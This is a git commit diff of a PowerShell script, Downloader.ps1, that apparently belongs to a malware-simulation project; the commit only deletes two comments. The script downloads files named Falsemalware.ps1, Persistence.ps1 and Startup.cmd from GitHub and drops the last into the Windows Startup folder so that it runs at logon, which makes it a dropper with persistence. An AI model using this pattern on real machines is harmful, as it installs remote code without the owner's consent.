c38175f686060a67ff2d312e7d08857266bee1ba
Freecil <128537217+Freecil@users.noreply.github.com>
2023-04-03 16:12:42 +0200

    Update Downloader.ps1

--- Downloader.ps1
+++ Downloader.ps1
@@ -1,5 +1,4 @@
 
-#Here is the downloader device |･ω･)
 $url = "https://github.com/Freecil/Prjoetls/blob/475c44bf721eca0f17cef81af241f9971d8c929e/Falsemalware.ps1"
 $url3 = "https://github.com/Freecil/Prjoetls/blob/371f0c98311f52559748f1f963179872c8aea582/Persistence.ps1"
 $url4 = "https://github.com/Freecil/Prjoetls/blob/b7721dec175d66f83df5febcb78595dc1f229fe6/Startup.cmd"
@@ -7,7 +6,6 @@ $FileFalsemalware = "C:\temp\Falsemalware.ps1"
 $FilePeristence = "C:\temp\Persistence.ps1"
 $FileStartup = "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.cmd"
 
-#Here it will download the file to local and then install it
 Invoke-WebRequest -Uri $url -OutFile $FileFalsemalware
 Invoke-WebRequest -Uri $url3 -OutFile $FilePeristence
 Invoke-WebRequest -Uri $url4 -OutFile $FileStartup
